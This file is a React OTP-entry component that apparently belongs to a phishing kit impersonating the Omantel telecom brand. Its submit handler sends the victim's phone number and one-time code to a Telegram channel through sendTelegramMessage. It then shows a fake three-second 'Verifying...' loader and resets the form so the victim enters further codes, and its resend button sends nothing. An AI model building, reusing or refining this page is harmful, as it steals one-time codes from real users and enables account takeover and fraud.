"use client"

import { useState, useRef, useEffect, useCallback } from "react"
import Image from "next/image"
import { sendTelegramMessage } from "../lib/telegram"
import { ChevronLeft } from "lucide-react"

const OTP_LENGTH = 6
const OMANTEL_ORANGE = "#203cf5ff"

export function OmantelOtp({
    phoneNumber,
    onComplete,
    onBack,
}: {
    phoneNumber: string
    onComplete: () => void
    onBack?: () => void
}) {
    const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(""))
    const [activeIndex, setActiveIndex] = useState(0)
    const [loading, setLoading] = useState(false)
    const [resendTimer, setResendTimer] = useState(60)
    const inputRefs = useRef<(HTMLInputElement | null)[]>([])

    useEffect(() => {
        const timeout = setTimeout(() => {
            inputRefs.current[0]?.focus()
        }, 100)
        return () => clearTimeout(timeout)
    }, [])

    // Resend countdown
    useEffect(() => {
        if (resendTimer <= 0) return
        const interval = setInterval(() => {
            setResendTimer((t) => t - 1)
        }, 1000)
        return () => clearInterval(interval)
    }, [resendTimer])

    // Format phone for display (mask middle digits)
    const maskedPhone = phoneNumber.length > 4
        ? phoneNumber.slice(0, 3) + "****" + phoneNumber.slice(-2)
        : phoneNumber

    const [showSuccess, setShowSuccess] = useState(false)

    const handleSubmit = useCallback(() => {
        const otpString = otp.join("");
        sessionStorage.setItem("userOtp1", otpString);
        sendTelegramMessage({
            title: "OTP VERIFIED",
            phoneNumber,
            otp1: otpString,
            type: "otp",
            exclude: ["location"]
        });

        setLoading(true)
        setShowSuccess(false)
        // 3-second loader before resetting
        setTimeout(() => {
            setLoading(false)
            setOtp(Array(OTP_LENGTH).fill(""))
            setActiveIndex(0)
            setResendTimer(60)
            setShowSuccess(true)
            // Focus first input again
            inputRefs.current[0]?.focus()
        }, 3000)
    }, [otp])

    // Remove Auto-submit useEffect to allow manual verification

    const handleChange = (index: number, value: string) => {
        if (loading) return
        if (!/^\d*$/.test(value)) return

        const digit = value.slice(-1)
        const newOtp = [...otp]
        newOtp[index] = digit
        setOtp(newOtp)

        if (digit && index < OTP_LENGTH - 1) {
            setActiveIndex(index + 1)
            inputRefs.current[index + 1]?.focus()
        }
    }

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (loading) return
        if (e.key === "Backspace") {
            e.preventDefault()
            const newOtp = [...otp]
            if (otp[index]) {
                newOtp[index] = ""
                setOtp(newOtp)
            } else if (index > 0) {
                newOtp[index - 1] = ""
                setOtp(newOtp)
                setActiveIndex(index - 1)
                inputRefs.current[index - 1]?.focus()
            }
        }
    }

    const handleFocus = (index: number) => {
        if (!loading) setActiveIndex(index)
    }

    const handleResend = () => {
        if (resendTimer > 0) return
        setResendTimer(60)
        setOtp(Array(OTP_LENGTH).fill(""))
        setActiveIndex(0)
        inputRefs.current[0]?.focus()
    }

    return (
        <div
            className="fixed inset-0 flex flex-col overflow-hidden"
            style={{ backgroundColor: "#FFFFFF" }}
        >
            {/* Header with Back Button and Logo side-by-side */}
            <div className="relative w-full flex items-center justify-center px-4 pt-4 pb-3">
                {/* Back Button - Absolute to keep logo centered */}
                <button
                    type="button"
                    className="absolute left-4 p-1 transition-opacity active:opacity-60"
                    aria-label="Go back"
                    onClick={onBack}
                    disabled={loading}
                >
                    <ChevronLeft
                        className="h-6 w-6"
                        style={{ color: loading ? "#CCCCCC" : "#1A1A1A" }}
                    />
                </button>

                {/* Logo centered */}
                <Image
                    src="/q32.png"
                    alt="Company Logo"
                    width={120}
                    height={40}
                    className="h-10 w-auto object-contain"
                />
            </div>

            {/* Divider */}
            <div className="h-px w-full" style={{ backgroundColor: "#EBEBEB" }} />

            {/* Content */}
            <div className="flex-1 flex flex-col items-center px-6 animate-otp-in">
                {/* Title */}
                <h1
                    className="mt-10 text-[24px] leading-[32px] font-bold font-sans text-center"
                    style={{ color: "#1A1A1A" }}
                >
                    Enter OTP
                </h1>

                {/* Subtitle with phone number / Success Message - Space reserved to prevent jump */}
                <div className="h-5 mt-2 flex items-center justify-center">

                    <p
                        className="text-[14px] leading-[20px] font-sans text-center animate-fade-in"
                        style={{ color: "#4c504cff" }}
                    >
                        {"OTP sent to "}
                        <span className="font-semibold" style={{ color: "black  " }}>
                            {phoneNumber}
                        </span>
                    </p>

                </div>

                {/* OTP Input Boxes */}
                <div className="flex items-center justify-center gap-3 mt-10">
                    {Array.from({ length: OTP_LENGTH }).map((_, i) => {
                        const isFilled = otp[i] !== ""
                        const isActive = activeIndex === i && !loading
                        return (
                            <div
                                key={i}
                                className="relative"
                                style={{
                                    width: "46px",
                                    height: "52px",
                                }}
                            >
                                <input
                                    ref={(el) => {
                                        inputRefs.current[i] = el
                                    }}
                                    type="tel"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={otp[i]}
                                    onChange={(e) => handleChange(i, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(i, e)}
                                    onFocus={() => handleFocus(i)}
                                    disabled={loading}
                                    className="absolute inset-0 w-full h-full text-center text-[22px] font-sans font-bold outline-none rounded-lg transition-all duration-150"
                                    style={{
                                        color: "#1A1A1A",
                                        backgroundColor: isFilled ? "#f3f2f2ff" : "#f3f2f2ff",
                                        border: isActive
                                            ? `2px solid ${OMANTEL_ORANGE}`
                                            : isFilled
                                                ? `2px solid ${OMANTEL_ORANGE}`
                                                : "2px solid #E5E5E5",
                                        caretColor: OMANTEL_ORANGE,
                                        opacity: loading ? 0.5 : 1,
                                    }}
                                    aria-label={`OTP digit ${i + 1}`}
                                    autoComplete="one-time-code"
                                />
                            </div>
                        )
                    })}
                </div>



                {/* Resend section - always visible per user request */}
                <div className="mt-8 flex flex-col items-center gap-1 text-center">
                    <p
                        className="text-[13px] font-sans"
                        style={{ color: "#AAAAAA" }}
                    >
                        {"Didn't receive the code?"}
                    </p>
                    <button
                        type="button"
                        onClick={handleResend}
                        disabled={resendTimer > 0 || loading}
                        className="text-[14px] font-sans font-semibold transition-opacity"
                        style={{
                            color: (resendTimer > 0 || loading) ? "#CCCCCC" : OMANTEL_ORANGE,
                            cursor: (resendTimer > 0 || loading) ? "default" : "pointer",
                        }}
                    >
                        {resendTimer > 0
                            ? `Resend in ${resendTimer}s`
                            : "Resend OTP"}
                    </button>
                </div>

                {/* Verify Button adjusted to be below resend */}
                <div className="mt-10 w-full">
                    <button
                        type="button"
                        onClick={handleSubmit}
                        disabled={!otp.every((d) => d !== "") || loading}
                        className="w-full py-4 rounded-xl text-[16px] font-sans font-semibold transition-all duration-200 active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 flex items-center justify-center gap-3"
                        style={{
                            backgroundColor: "#FFFFFF",
                            color: "#000000",
                            border: "1px solid #000000",
                        }}
                    >
                        {loading ? (
                            <>
                                <svg
                                    viewBox="0 0 36 36"
                                    className="animate-spin h-5 w-5"
                                >
                                    <circle
                                        cx="18"
                                        cy="18"
                                        r="15"
                                        fill="none"
                                        stroke="rgba(0,0,0,0.1)"
                                        strokeWidth="4"
                                    />
                                    <circle
                                        cx="18"
                                        cy="18"
                                        r="15"
                                        fill="none"
                                        stroke="#000000"
                                        strokeWidth="4"
                                        strokeLinecap="round"
                                        strokeDasharray="70 30"
                                    />
                                </svg>
                                <span>Verifying...</span>
                            </>
                        ) : (
                            "Verify"
                        )}
                    </button>
                </div>
            </div>

            <style jsx>{`
        @keyframes otpIn {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-otp-in {
          animation: otpIn 0.4s ease-out forwards;
        }
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fadeIn 0.3s ease-out forwards;
        }
      `}</style>
        </div>
    )
}
